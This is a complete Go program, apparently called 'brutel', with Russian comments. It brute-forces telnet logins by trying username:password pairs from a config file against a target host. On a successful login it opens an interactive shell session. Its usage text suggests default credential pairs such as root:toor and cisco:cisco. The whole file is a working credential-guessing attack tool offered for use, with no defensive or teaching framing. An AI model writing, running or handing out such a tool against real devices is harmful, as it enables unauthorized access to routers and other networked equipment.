package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"regexp"
	"strings"
	"time"
)

// Структура для хранения пары логин/пароль
type Credential struct {
	Username string
	Password string
}

// Загрузка кредов из INI (поддерживаем свой формат)
func loadCredentials() []Credential {
	var creds []Credential
	
	// Читаем файл построчно
	data, err := os.ReadFile("config.ini")
	if err != nil {
		fmt.Println("Ошибка чтения config.ini:", err)
		fmt.Println("Создайте файл с секцией [credentials]")
		os.Exit(1)
	}
	
	lines := strings.Split(string(data), "\n")
	inCredentials := false
	
	for _, line := range lines {
		line = strings.TrimSpace(line)
		
		// Пропускаем пустые и комментарии
		if line == "" || strings.HasPrefix(line, ";") || strings.HasPrefix(line, "#") {
			continue
		}
		
		// Проверяем секцию
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			inCredentials = strings.ToLower(line) == "[credentials]"
			continue
		}
		
		if !inCredentials {
			continue
		}
				
		// Поддерживаем несколько пар через запятую
		pairs := strings.Split(line, ",")
		for _, pair := range pairs {
			pair = strings.TrimSpace(pair)
			if pair == "" {
				continue
			}
			
			credsParts := strings.SplitN(pair, ":", 2)
			if len(credsParts) == 2 {
				creds = append(creds, Credential{
					Username: strings.TrimSpace(credsParts[0]),
					Password: strings.TrimSpace(credsParts[1]),
				})
			}
		}
	}
	
	return creds
}

// Попытка подключения с конкретными кредами
func tryLogin(host string, cred Credential) (net.Conn, error) {
	// Парсим хост
	if !strings.Contains(host, ":") {
		host = host + ":23"
	}
	
	conn, err := net.DialTimeout("tcp", host, 5*time.Second)
	if err != nil {
		return nil, fmt.Errorf("ошибка подключения: %v", err)
	}
	
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	
	// Читаем приветствие
	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	response := string(buf[:n])
	
	// Отправляем логин
	if strings.Contains(strings.ToLower(response), "login") {
		conn.Write([]byte(cred.Username + "\r\n"))
		time.Sleep(200 * time.Millisecond)
		
		// Читаем запрос пароля
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, _ = conn.Read(buf)
		response = string(buf[:n])
		
		// Отправляем пароль
		if strings.Contains(strings.ToLower(response), "password") {
			conn.Write([]byte(cred.Password + "\r\n"))
			time.Sleep(300 * time.Millisecond)
		}
	}
	
	// Проверяем успешность входа
	// Если после отправки пароля пришёл пригласительный знак ($, >, # и т.д.)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, _ = conn.Read(buf)
	response = string(buf[:n])

	// Если пришёл $ или > делаем enable admin
	

	// Проверяем наличие признаков успешного входа
	if strings.Contains(response, "$") || 
	   strings.Contains(response, ">") || 
	   strings.Contains(response, "#") ||
	   strings.Contains(response, "Welcome") ||
	   strings.Contains(response, "successful") {
		return conn, nil
	}
	
	// Если есть "Login incorrect" или "Authentication failed" - ошибка
	if strings.Contains(strings.ToLower(response), "incorrect") ||
	   strings.Contains(strings.ToLower(response), "failed") ||
	   strings.Contains(strings.ToLower(response), "denied") {
		conn.Close()
		return nil, fmt.Errorf("неверный логин/пароль")
	}
	
	// Если ничего не понятно - считаем что вход успешен
	return conn, nil
}

// Основная функция подключения с перебором кредов
func telnetConnectWithRetry(host string, creds []Credential) error {
	var lastErr error
	
	for i, cred := range creds {
		fmt.Printf("Попытка %d/%d: %s:%s ... ", 
			i+1, len(creds), cred.Username, cred.Password)
		
		conn, err := tryLogin(host, cred)
		if err == nil {
			fmt.Println("✅ Успешно!")
			fmt.Printf("\n--- Сессия открыта под %s ---\n", cred.Username)
			fmt.Println("Вводите команды (Ctrl+C для выхода)")
			
			// Интерактивный режим
			go func() {
				scanner := bufio.NewScanner(conn)
				for scanner.Scan() {
					fmt.Println(scanner.Text())
				}
			}()
			
			stdinScanner := bufio.NewScanner(os.Stdin)
			for stdinScanner.Scan() {
				cmd := stdinScanner.Text()
				conn.Write([]byte(cmd + "\r\n"))
			}
			return nil
		}
		
		fmt.Println("❌ Ошибка:", err)
		lastErr = err
	}
	
	return fmt.Errorf("все попытки входа не удались. Последняя ошибка: %v", lastErr)
}

// Парсинг telnet:// ссылок
func parseTelnetURL(url string) string {
	re := regexp.MustCompile(`telnet://([^:/]+)`)
	matches := re.FindStringSubmatch(url)
	if len(matches) > 1 {
		return matches[1]
	}
	return url
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Использование:")
		fmt.Println("  brutel.exe 192.168.0.1")
		fmt.Println("  brutel.exe telnet://192.168.0.1")
		fmt.Println("  brutel.exe 10.0.0.5:2323")
		os.Exit(1)
	}
	
	// Загружаем креды
	creds := loadCredentials()
	if len(creds) == 0 {
		fmt.Println("Ошибка: в config.ini нет логинов в секции [credentials]")
		fmt.Println("Пример:")
		fmt.Println("[credentials]")
		fmt.Println("admin:admin123")
		fmt.Println("root:toor")
		fmt.Println("admin:admin,user:user,cisco:cisco")
		os.Exit(1)
	}
	
	fmt.Printf("Загружено %d логинов для перебора\n", len(creds))
	
	// Парсим аргумент
	arg := os.Args[1]
	host := parseTelnetURL(arg)
	
	// Подключаемся с перебором
	if err := telnetConnectWithRetry(host, creds); err != nil {
		fmt.Println("\n❌", err)
		os.Exit(1)
	}
}